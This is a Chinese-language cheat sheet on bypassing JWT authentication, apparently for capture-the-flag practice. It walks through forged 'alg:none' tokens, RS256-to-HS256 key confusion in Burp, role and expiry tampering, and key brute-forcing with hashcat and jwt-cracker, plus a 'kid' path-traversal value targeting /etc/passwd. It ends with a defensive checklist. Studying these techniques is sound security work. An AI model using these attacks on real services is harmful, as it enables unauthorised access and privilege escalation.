# JWT认证绕过秘笈

## 算法混淆攻击

### 算法改为 none
```
原始JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

修改为: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
# {"alg":"none","typ":"JWT"}

完整攻击JWT:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.

# 注意：没有签名部分（最后一个.后为空）
```

### HMAC密钥替换为公钥
```
原始：
Header: {"alg":"RS256"}  # RSA (非对称)
使用私钥签名

攻击：
改为: {"alg":"HS256"}  # HMAC (对称)
用公钥作为HMAC密钥签名

# 攻击者：
# 1. 获取服务器的公钥（通常公开）
# 2. 用公钥作为HMAC密钥重新签名payload
# 3. 服务器用同一个公钥验证（HMAC模式）
```

### HMAC密钥替换为公钥（详细操作步骤）

**攻击原理**：
1. 应用使用RS256算法，用私钥签名
2. 攻击者将alg改为HS256
3. 用公钥作为HMAC密钥重新签名
4. 服务器用同一个公钥验证（HMAC模式）

**详细操作步骤（使用Burp JWT Editor）**：

#### 步骤1：获取公钥
```bash
# 从服务器获取公钥（通常公开）
curl http://target.com/public.key

# 或访问/public.key路径
# 公钥通常是PEM格式：
# -----BEGIN PUBLIC KEY-----
# MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
# -----END PUBLIC KEY-----
```

#### 步骤2：base64url编码公钥
```python
# Python示例：将PEM格式公钥转换为base64url编码
import base64

# 读取公钥文件
with open('public.key', 'r') as f:
    public_key = f.read()

# 去除PEM格式的头部和尾部，只保留密钥内容
key_content = public_key.replace('-----BEGIN PUBLIC KEY-----', '')
key_content = key_content.replace('-----END PUBLIC KEY-----', '')
key_content = key_content.replace('\n', '').replace(' ', '')

# base64解码后再进行base64url编码
# base64url编码：将+替换为-，/替换为_，去掉=填充
decoded = base64.b64decode(key_content)
encoded = base64.urlsafe_b64encode(decoded).decode('utf-8').rstrip('=')
print(encoded)
```

**或者使用在线工具**：
- 将PEM格式公钥内容（去除头部尾部）进行base64解码
- 再将结果进行base64url编码（+→-, /→_, 去掉=）

#### 步骤3：在Burp JWT Editor中导入密钥
1. 打开Burp Suite的JWT Editor插件
2. 选择"New Symmetric Key"
3. 点击"Generate"生成密钥
4. 将Key栏中的`k`字段值替换为base64url编码后的公钥
5. 点击"OK"确认

#### 步骤4：修改JWT并签名
1. 在请求中找到JWT token
2. 修改payload中的用户字段（如`user`改为`admin`，`sub`改为`admin`）
3. 修改header中的`alg`字段为`HS256`
4. 点击下方的"Sign"按钮
5. 选择刚刚创建的密钥
6. 发送请求

**完整示例**：
```bash
# 原始JWT（RS256）
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.signature

# 修改后（HS256，用公钥签名）
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.new_signature
```

**适用场景**：
- 应用使用RS256算法
- 公钥可以获取（通常公开，如/public.key）
- 服务器未明确指定验证算法，允许算法切换
- 私钥无法获取时（如web350题目）

**注意事项**：
- 某些实现可能明确指定算法，不允许切换
- 需要确认服务器是否真的用公钥验证HS256签名
- base64url编码必须正确，否则签名验证会失败

### 支持多种算法
```
如果应用支持多种算法：
1. 应用用RS256生成token
2. 攻击者改为HS256
3. 用泄露的公钥作为HMAC密钥
4. 应用错误地使用该公钥验证HS256签名
```

## Payload篡改

### 修改用户ID
```
原始: {"sub":"user123","role":"user"}
修改: {"sub":"admin","role":"user"}

签名方式：
1. 如果使用弱密钥（如application_name）可暴力破解
2. 如果能改为none算法，无需签名
```

### 添加权限声明
```
原始: {"sub":"user123","role":"user","exp":1234567890}
修改: {"sub":"user123","role":"admin","exp":9999999999}

攻击：
- 添加admin角色
- 延长过期时间
```

### 修改过期时间
```
原始: {"sub":"user123","exp":1609459200}
修改: {"sub":"user123","exp":9999999999}

# 如果仅验证签名，不验证exp，token永久有效
```

## 密钥攻击

### 暴力破解密钥
```
如果使用弱密钥（如应用名称、版本号等）

常见弱密钥：
- secret
- application_name
- password
- 123456
- admin

工具：
jwt-cracker, hashcat, john
```

### 字典攻击
```bash
# 使用JWT破解工具进行字典攻击
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# 使用jwt-cracker进行字典攻击
jwt-cracker -t <JWT_TOKEN> -d rockyou.txt
```

### 字符表爆破
当密钥长度较短且可能由特定字符集组成时，可以使用字符表爆破：

```bash
# 使用jwt-cracker进行字符表爆破
jwt-cracker -t <JWT_TOKEN> -a 'qwertyuiopasdfghjklzxcvbnm'

# 常用字符集：
# - 小写字母：'qwertyuiopasdfghjklzxcvbnm'
# - 大写字母：'QWERTYUIOPASDFGHJKLZXCVBNM'
# - 数字：'0123456789'
# - 组合：'qwertyuiopasdfghjklzxcvbnm0123456789'

# 优势：
# - 比字典攻击更快（当密钥无规律时）
# - 适合短密钥（4-6位）
# - 可以自定义字符集

# 示例：
jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -a 'qwertyuiopasdfghjklzxcvbnm'
```

**适用场景**：
- 密钥长度较短（4-6位）
- 密钥可能由特定字符集组成
- 字典攻击失败时
- 密钥无规律但字符集已知

### 密钥泄露
```
检查：
1. GitHub commits（.env, config files）
2. 应用源代码（开源项目）
3. Docker镜像（密钥嵌入）
4. 配置文件
```

## Header注入和混淆

### 可信header注入
```
原始: {"alg":"HS256","typ":"JWT"}

添加恶意header:
{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}
# 某些实现可能解释kid（Key ID）并加载文件
```

### 类型混淆
```
{"typ":"JWT"} 改为
{"typ":"json"} 或无此字段

某些验证可能因此失败
```

## 签名验证绕过

### 缺少签名验证
```
虽然Token是signed，但服务器未验证签名

def verify_token(token):
    header, payload, signature = token.split('.')
    # 仅验证payload，未验证signature
    return json.loads(base64_decode(payload))
```

### 验证逻辑漏洞
```php
// 错误的验证
if (verify_signature($token, $secret)) {
    $payload = decode($token);
} else if (decode($token)['alg'] == 'none') {  // 先验证失败后处理none?
    $payload = decode($token);
}
```

## Token重用和重放

### 缺少唯一性验证
```
同一个token可以多次使用

攻击：
1. 获取一个有效token
2. 重复使用进行多次操作
3. 无速率限制或重放保护
```

### JTI（JWT ID）缺失
```
原始（安全）:
{"sub":"user123","jti":"unique_id_12345","exp":...}

不安全：
{"sub":"user123","exp":...}  # 无jti，无法追踪token使用

攻击：复用token
```

## 时间和过期绕过

### 修改iat（签发时间）
```
原始: {"iat":1609459200,"exp":1609462800}  # 3600秒有效期

修改: {"iat":9999999999,"exp":9999999999}  # 未来时间戳

如果仅检查exp < now，可能接受
```

### 令牌刷新漏洞
```
1. 获取过期的token
2. 使用refresh_token换取新token
3. 如果refresh_token验证不当，可获得任意新token

或修改refresh_token中的payload并重新签名
```

## 跨服务token复用

### 多服务共享密钥
```
Service A和B使用相同密钥

攻击：
1. 从Service A获取有效token
2. 用于Service B（sub号相同但权限不同）
3. 可能导致权限提升
```

### Token格式相同但验证不同
```
Service A: 验证sub字段
Service B: 仅验证签名

攻击：
1. 从A获取sub为user的token
2. 修改sub为admin
3. B仅验证签名，接受修改的token（如果使用same密钥）
```

## 快速定位和利用

**关键词识别**：
- decode()或verify()未正确实现
- 支持多种算法
- 无alg验证或允许none
- 过期时间检查缺失
- 密钥硬编码或弱密钥

**测试优先级**：
1. 改为none算法（最简单）
2. 修改payload重新签名（如果可暴力破解）
3. HMAC-RS256混淆（用公钥作HMAC密钥）
4. 修改用户ID和权限
5. 延长或移除过期时间

## 防御检查清单

- ✓ 始终验证签名，不允许none算法
- ✓ 使用强密钥（≥256位随机数）
- ✓ 明确指定算法，不让客户端选择
- ✓ 验证exp和iat字段
- ✓ 使用jti防止重放
- ✓ 定期轮换密钥
- ✓ 黑名单已登出的token
- ✓ 关键操作要求额外验证
